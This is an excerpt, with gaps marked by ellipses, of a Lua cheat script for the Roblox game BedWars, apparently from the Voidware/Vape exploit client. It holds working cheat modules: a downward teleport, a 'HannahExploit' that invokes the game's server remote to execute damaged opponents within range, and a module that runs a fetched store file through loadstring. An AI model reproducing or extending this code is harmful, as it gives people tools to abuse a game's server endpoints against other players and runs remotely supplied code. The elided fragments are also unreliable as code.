			Function = function(callback)
				if callback then
					task.spawn(function()
						GroundTP.ToggleButton(false)
						if lplr.Character.Humanoid.FloorMaterial ~= Enum.Material.Air or not isnetworkowner(entityLibrary.character.Humanoid) then return end
						lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -GroundTPVertical.Value, 0)
					end)
				end
			end
		})
		GroundTPVertical = GroundTP.CreateSlider({
			Name = "Vertical",
			Function = function() end,
			Min = 5,
			Max = 3000,
	...
	runFunction(function()
		...
		Function = function(callback)
			if callback then
				task.spawn(function()
					if not isPlayerLoaded(lplr) then repeat task.wait() until isPlayerLoaded(lplr) end
					if bedwarsStore.equippedKit ~= "hannah" then warningNotification("HannahAura", "Hannah kit Required") HannahExploit.ToggleButton(false) return end
					table.insert(HannahExploit.Connections, vapeEvents.EntityDamageEvent.Event:Connect(function(tab)
						local ent = playersService:GetPlayerFromCharacter(tab.entityInstance)
						if ent ~= lplr then
							if ent.Character.Humanoid.Health < ent.Character:GetAttribute("MaxHealth") then
								local plrmag = GetMagnitudeOf2Objects(ent.Character.PrimaryPart, lplr.Character.PrimaryPart)
								if GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled then return end
								bedwars.HannahRemote:InvokeServer(table.unpack({
									[1] = {
										user = lplr,
										victimEntity = not ExecuteRangeCheck.Enabled and tab.entityInstance or plrmag <= ExecuteRange.Value and tab.entityInstance or nil
									}
								}))
							end
						end
	...
	ExecuteRange = HannahExploit.CreateSlider({
		...
		Max = 60
			...
			runFunction(function()
				if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] > 1 then
				local packalreadyloaded
				local txtpack = {Enabled = false}
				txtpack = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
				Name = "SwordPacks",
				Function = function(callback)
					if callback then
						task.spawn(function()
							if packalreadyloaded then
								return
							end
							loadstring(VoidwareStore.GetFile("data/swords.lua"))()
							packalreadyloaded = true
						end)
					else
						warningNotification("TexturePack","Disabled on rejoin.")
					end
				end,
				HoverText = "Sword packs."
			})
		end
		end)
				...
				runFunction(function()
					...
					local TextureStyle = {Value = "6"}
					local objs
					local weldconnection
					PrivateTexturePack = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
						Name = "MeteorTexturePack",
						Function = function(callback)
							if callback then
								task.spawn(function()
									pcall(function()
									local Players = playersService
									local ReplicatedStorage = replicatedStorageService
									if objs then
										objs[1].Parent = nil
									end
									objs = game:GetObjects("rbxassetid://10976374981")
									local Workspace = workspace
									objs[1].Parent = replicatedStorageService
										...
										for i,v in pairs(VM:GetChildren()) do
											for _,indexed in pairs(index) do
												if indexed[1] == v.Name then
													...
													local ThirdPersonItem = lplr.Character:FindFirstChild(v.Name)
